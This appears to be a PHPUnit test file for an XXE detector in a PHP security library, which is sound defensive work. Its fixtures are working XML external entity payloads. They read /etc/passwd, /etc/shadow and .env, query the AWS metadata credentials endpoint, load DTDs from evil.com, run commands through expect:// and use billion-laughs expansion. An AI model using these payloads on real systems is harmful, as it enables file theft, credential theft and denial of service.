<?php

declare(strict_types=1);

namespace AdosLabs\EnterpriseSecurityShield\Tests\Unit\Detection;

use AdosLabs\EnterpriseSecurityShield\Detection\XXEDetector;
use PHPUnit\Framework\TestCase;

/**
 * @covers \AdosLabs\EnterpriseSecurityShield\Detection\XXEDetector
 */
final class XXEDetectorTest extends TestCase
{
    private XXEDetector $detector;

    protected function setUp(): void
    {
        $this->detector = new XXEDetector();
    }

    // =========================================================================
    // BASIC XXE DETECTION
    // =========================================================================

    public function testDetectsDoctypeDeclaration(): void
    {
        $xml = '<?xml version="1.0"?><!DOCTYPE foo><root>test</root>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['has_doctype']);
    }

    public function testDetectsExternalEntityWithSystem(): void
    {
        $xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(95, $result['confidence']);
        $this->assertContains('FILE_DISCLOSURE', $result['attack_types']);
    }

    public function testDetectsExternalEntityWithPublic(): void
    {
        $xml = '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe PUBLIC "public_id" "http://evil.com/xxe.dtd">
]>
<root>&xxe;</root>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    // =========================================================================
    // FILE DISCLOSURE TESTS
    // =========================================================================

    public function testDetectsFileProtocol(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(99, $result['confidence']);
        $this->assertContains('FILE_DISCLOSURE', $result['attack_types']);
    }

    public function testDetectsPhpFilterWrapper(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(99, $result['confidence']);
        $this->assertContains('FILE_DISCLOSURE', $result['attack_types']);
    }

    public function testDetectsEtcPasswdTarget(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(99, $result['confidence']);
    }

    public function testDetectsEtcShadowTarget(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/shadow">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(99, $result['confidence']);
    }

    public function testDetectsWindowsFilePath(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "C:\\\\Windows\\\\System32\\\\config\\\\SAM">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('FILE_DISCLOSURE', $result['attack_types']);
    }

    // =========================================================================
    // SSRF TESTS
    // =========================================================================

    public function testDetectsHttpSsrf(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    public function testDetectsHttpsSsrf(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://internal-server/api/secrets">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    public function testDetectsFtpSsrf(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://internal-ftp/sensitive">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    public function testDetectsGopherSsrf(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://internal:25/_HELO">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    public function testDetectsAwsMetadataEndpoint(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(98, $result['confidence']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    public function testDetectsInternalIpSsrf(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/admin">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('SSRF', $result['attack_types']);
    }

    // =========================================================================
    // REMOTE CODE EXECUTION
    // =========================================================================

    public function testDetectsExpectWrapper(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertEquals(100.0, $result['confidence']);
        $this->assertContains('REMOTE_CODE_EXECUTION', $result['attack_types']);
        $this->assertEquals('CRITICAL', $result['risk_level']);
    }

    // =========================================================================
    // PARAMETER ENTITY (BLIND XXE)
    // =========================================================================

    public function testDetectsParameterEntity(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertGreaterThanOrEqual(95, $result['confidence']);
        $this->assertContains('PARAMETER_ENTITY', $result['attack_types']);
    }

    public function testDetectsParameterEntityReference(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%file;\'>">%eval;%error;]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
    }

    // =========================================================================
    // DENIAL OF SERVICE (BILLION LAUGHS)
    // =========================================================================

    public function testDetectsBillionLaughsPattern(): void
    {
        $xml = '<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('DENIAL_OF_SERVICE', $result['attack_types']);
    }

    public function testDetectsEntityExpansion(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY boom "&a;&b;&c;">]>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('DENIAL_OF_SERVICE', $result['attack_types']);
    }

    // =========================================================================
    // XINCLUDE TESTS
    // =========================================================================

    public function testDetectsXInclude(): void
    {
        $xml = '<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>';

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
        $this->assertContains('FILE_DISCLOSURE', $result['attack_types']);
    }

    public function testDetectsXIncludeNamespace(): void
    {
        $xml = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><data>test</data></foo>';

        $result = $this->detector->detect($xml);

        // Just namespace declaration has lower confidence
        $this->assertTrue($result['has_external'] || $result['detected'] || $result['confidence'] > 0);
    }

    // =========================================================================
    // ENCODING BYPASS TESTS
    // =========================================================================

    public function testDetectsUrlEncodedXxe(): void
    {
        $xml = urlencode('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>');

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
    }

    public function testDetectsDoubleUrlEncodedXxe(): void
    {
        $xml = urlencode(urlencode('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'));

        $result = $this->detector->detect($xml);

        $this->assertTrue($result['detected']);
    }

    // =========================================================================
    // SENSITIVE FILE PATH DETECTION
    // =========================================================================

    public function testDetectsSensitiveFilePaths(): void
    {
        $sensitiveFiles = [
            '/etc/passwd',
            '/etc/shadow',
            '/proc/self/environ',
            '.htaccess',
            '.env',
            'wp-config.php',
        ];

        foreach ($sensitiveFiles as $file) {
            $xml = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{$file}\">]>";
            $result = $this->detector->detect($xml);

            $this->assertTrue(
                $result['detected'],
                "Should detect sensitive file: {$file}",
            );
        }
    }

    // =========================================================================
    // FALSE POSITIVE TESTS
    // =========================================================================

    public function testDoesNotDetectNormalXml(): void
    {
        $xml = '<?xml version="1.0"?><root><item>Hello World</item></root>';

        $result = $this->detector->detect($xml);

        $this->assertFalse($result['detected']);
    }

    public function testDoesNotDetectNormalText(): void
    {
        $result = $this->detector->detect('Hello World');

        $this->assertFalse($result['detected']);
    }

    public function testDoesNotDetectNormalHtml(): void
    {
        $html = '<html><body><p>Normal content</p></body></html>';

        $result = $this->detector->detect($html);

        $this->assertFalse($result['detected']);
    }

    // =========================================================================
    // QUICK CHECK TESTS
    // =========================================================================

    public function testIsXxeReturnsTrueForXxe(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';

        $this->assertTrue($this->detector->isXXE($xml));
    }

    public function testIsXxeReturnsFalseForSafeXml(): void
    {
        $xml = '<root>safe content</root>';

        $this->assertFalse($this->detector->isXXE($xml));
    }

    // =========================================================================
    // SANITIZATION TESTS
    // =========================================================================

    public function testSanitizeRemovesDoctype(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>';

        $sanitized = $this->detector->sanitize($xml);

        $this->assertStringNotContainsString('DOCTYPE', $sanitized);
        $this->assertStringNotContainsString('ENTITY', $sanitized);
    }

    public function testSanitizeRemovesXInclude(): void
    {
        $xml = '<foo><xi:include href="file:///etc/passwd"/></foo>';

        $sanitized = $this->detector->sanitize($xml);

        $this->assertStringNotContainsString('xi:include', $sanitized);
    }

    // =========================================================================
    // SAFE PARSER CONFIG TESTS
    // =========================================================================

    public function testGetSafeParserConfigReturnsArray(): void
    {
        $config = XXEDetector::getSafeParserConfig();

        $this->assertIsArray($config);
        $this->assertArrayHasKey('libxml_options', $config);
        $this->assertArrayHasKey('disable_external_entities', $config);
        $this->assertArrayHasKey('recommended_flags', $config);
    }

    // =========================================================================
    // RISK LEVEL TESTS
    // =========================================================================

    public function testCriticalRiskForRce(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>';

        $result = $this->detector->detect($xml);

        $this->assertEquals('CRITICAL', $result['risk_level']);
    }

    public function testCriticalRiskForFileProtocol(): void
    {
        $xml = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';

        $result = $this->detector->detect($xml);

        $this->assertEquals('CRITICAL', $result['risk_level']);
    }

    // =========================================================================
    // THRESHOLD TESTS
    // =========================================================================

    public function testHighThresholdReducesDetection(): void
    {
        $detector = new XXEDetector(0.95);

        // Just DOCTYPE without dangerous content
        $result = $detector->detect('<!DOCTYPE foo><root>test</root>');

        // With high threshold, just DOCTYPE may not trigger
        $this->assertFalse($result['detected']);
    }

    public function testLowThresholdIncreasesDetection(): void
    {
        $detector = new XXEDetector(0.3);

        $result = $detector->detect('<!DOCTYPE foo><root>test</root>');

        // With low threshold, DOCTYPE alone may trigger
        $this->assertTrue($result['detected']);
    }
}
